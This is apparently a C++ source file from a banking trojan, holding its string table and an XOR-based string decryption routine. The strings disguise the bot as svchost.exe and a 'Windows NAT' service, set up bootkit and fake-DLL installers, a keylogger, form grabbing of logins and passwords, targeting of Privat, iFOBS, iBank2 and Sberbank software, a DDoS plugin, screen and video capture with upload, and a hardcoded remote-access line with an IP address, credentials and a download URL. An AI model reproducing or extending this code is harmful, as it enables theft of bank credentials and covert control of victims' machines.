//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
#include "Crypt.h"

#include "Modules.h"

//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result;

	bool Encrypted = (EncryptedStr > BeginCryptBlock) && (EncryptedStr < EndCryptBlock) && 
     				 (BeginCryptBlock[0] != 'C');

	if (Encrypted)
	{
		// �������������� ������
		Result = XORCrypt::DecodeString(GetSessionPassword(), EncryptedStr);
	}
	else
		Result = EncryptedStr;

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  ���� �������� ����������� �����.
//  ��� ������ ����������� ���� � �� �����������
//  CSEND
//  ����� ����������� ��������
//=============================================================================


CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // ������� ����������� �������� ����������������, ��� ��� �������
CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //������� ���������������, ��� ������� ��� �� ��� �������


// ������������ ��� ��� ����� ����
CSSTR EStrOriginalBotExeName[] = "WtJoeBt.exe";
CSSTR EStrBotStartupLinkName[] = "wslneo.lnk";  // ��� ������ � ������������

// �������������� �������
CSSTR EStrBotServiceExePath[] = "com\\";

// ��� ��� ����� ������� ����
CSSTR EStrBotServiceExeName[] = "svchost.exe";


// ��� �������
CSSTR EStrServiceName[] = "Windows NAT";


// ������� ���������� � �����
CSSTR StrBotWorkPath[] = "WnsBMT"; // ������� ������� ����
CSSTR StrGrabberPath[] = "gdata";  // ��� ������� ����� �������

CSSTR EStrConfigFileName[]   = "igfxtray.dat"; // ��� ����� �������� �������
CSSTR EStrConfigHPFileName[] = "igfxtrayhp.dat"; // ��� ����� �������� ������� ����������� ����������


// ����� ��������� ������
CSSTR EStrPipeLoader[] = "ldrspp"; // ��� ���������� ����� �������



// ��������� �������, ������������ ����� ����� ���������
CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // ������� �� �������� exe ����

// ����� ��������� �����
CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // ���� �������� ��������
CSSTR EStrTemporaryPrefixFileName[] = "mnprsdd.tmp"; // ��������� ���� �������� ��������


// ��� ������� ���� � ���� ���
CSSTR EStrBotPlug[] = "bot.plug";

// ��� ���������� �������
CSSTR EStrBootkitInstaller[] = "bki.plug";


//��� ������ ��������
CSSTR EStrSystemPrivat[] = "privat"; // ������ ������ �����������
#ifdef IfobsOnlineH
CSSTR EStrSystemIfobsOnline[] = "IfobsOnline"; // ������ ������� Ifobs ������
#endif



CSSTR EStrCabNameDisketa[] = "disketa"; // ��� ���� ��� �������� �����������

// ��� ����������� ����� ������������ ���������
CSSTR EStrInfiniteKeyLoggerSignal[] = "iks.dat";



// ��� ����������� �������
CSSTR EStrFakeDllInstaller[] = "fdi.plug";
// ��� ����� �� �������� ����������, ��� ����������� ������� (���� � ����� ����)
CSSTR EStrFakeDllFlag[] = "fdi.txt";
//��� ����� �� �������� ����������, ��� ����������� ������� � ������� �����
CSSTR EStrFakeDllIFobsFlag[] = "ifobsfdi.txt";


// �������� ������, ������� ����� �������� ���
CSSTR EStrCommandInstallFakeDLL[] = "installfd";  // ������� �� ���������� �������
CSSTR EStrCommandInstallBootkit[] = "installbk";  // ������� �� ���������� �������


// ����� ������, ��� ���������� � ���
CSSTR StrLogFileScreenShot[]  = "Screen.png";
CSSTR StrLogFileInformation[] = "Info.txt";
CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";
CSSTR EStrLogKeyPath[]         = "Keys";


// ������ ����� ����
CSSTR EStrLogFieldLogin[]       = "Login";
CSSTR EStrLogFieldPassword[]    = "Password";
CSSTR EStrLogFieldKeyPassword[] = "KeyPassword";
CSSTR EStrLogFieldURL[]         = "URL";




// ����� ������� ���������� �����������.
CSSTR VideoRecFuncInit[]			= "Init";
CSSTR VideoRecFuncRelease[]			= "Release";
CSSTR VideoRecUpdateSettings[]		= "UpdateSettings";
CSSTR VideoRecFuncAddIPServer[]		= "AddIPServer";
CSSTR VideoRecFuncRecordProcess[]	= "StartRecPid";
CSSTR VideoRecFuncRecordWnd[]		= "StartRecHwnd";
CSSTR VideoRecFuncStop[]			= "StopRec";
CSSTR VideoRecFuncResetTime[]		= "ResetTime";
CSSTR VideoRecFuncSendFiles[]		= "StartSend";
CSSTR VideoRecFuncSendFilesAsync[]	= "StartSendAsync";
CSSTR VideoRecFuncIsSendedAsync[]	= "IsSendedAsync";
CSSTR VideoRecFuncFolderIsUpload[]	= "FolderIsUpload";
CSSTR VideoRecFuncRunCmdExec[]		= "RunCmdExec";
CSSTR VideoRecFuncSendLog[]			= "SendLog";
CSSTR VideoRecPipe[]				= "VideoServer";


CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
CSSTR HTTPOctetStream[]            = "application/octet-stream";


CSSTR IFobsFlagCopy[] = "ifobscopy.txt";


// ������ ������ AzConfig
#ifdef AzConfigH
	CSSTR AzConfigParamUserName[] = "%az_user%";
#endif


// ������ ������ BSS �������
#ifdef BSSH
	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
							 "Login:     %s\r\n"
							 "Password:  %s\r\n\r\n"
							 "UserAgent: %s\r\n";
#endif



#ifdef FakeDllInstallerH
	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
	CSSTR EStrIBankFileName[]     = ".iBank2"; // ��� ����� ��� ����������� �������� ����� ����������� Fake DLL
#endif


#ifdef ddosH
	// ��� ������� DDOS
	CSSTR EStrDDOSPlugin[] = "ddos.plug";

	// ��� ����� ������ ��� ������� DDOS
	CSSTR EStrDDOSSignal[] = "ddos.sig";
#endif


CSSTR RDPRunParam[] = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixerESCONuendoZ;http://www.cushyhost.com/download.php?img=73";

//=============================================================================
// ����� ����� ����������� �����
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// �� ����������� ������
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
